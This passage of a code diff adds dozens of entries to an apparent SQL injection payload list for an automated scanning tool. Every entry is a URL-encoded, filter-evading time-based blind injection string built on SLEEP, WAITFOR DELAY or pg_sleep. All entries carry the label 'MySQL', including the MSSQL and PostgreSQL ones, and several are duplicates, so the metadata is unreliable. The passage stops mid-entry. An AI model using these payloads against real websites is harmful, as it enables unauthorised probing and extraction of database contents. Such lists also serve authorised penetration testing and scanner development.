+                "payload": "%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20and%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20and%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20and%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20AND%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20or%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20or%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20or%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20or%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20pg_sleep(dexp(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20pg_sleep(div(10,%202))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20pg_sleep(dlog1(50000))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20pg_sleep(dlog10(500000))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20pg_sleep(dpow(3,%202))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20pg_sleep(dsqrt(100))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20pg_sleep(mod(20,%2011))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20SECOND(IF(1=1,SLEEP(SECOND(10)),0))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20SECOND(IF(1=1,SLEEP(SECOND(10)),0))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(MOD(21,%2011))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(MOD(21,%2011))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(REPEAT(10,%201))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(REPEAT(10,%201))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(REPLACE(\"19\",%20\"9\",%20\"0\"))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(REPLACE(\"19\",%20\"9\",%20\"0\"))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(SECOND(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(SECOND(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%01'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%02'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%06'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%0F'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%13'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%14'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%15'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%16'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%17'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%1A'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%1B'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%1C'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%1E'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%1F'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%4E'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20WAITFOR%20DELAY%20%C2%A0'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20xor(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20XOR(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))XOR",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
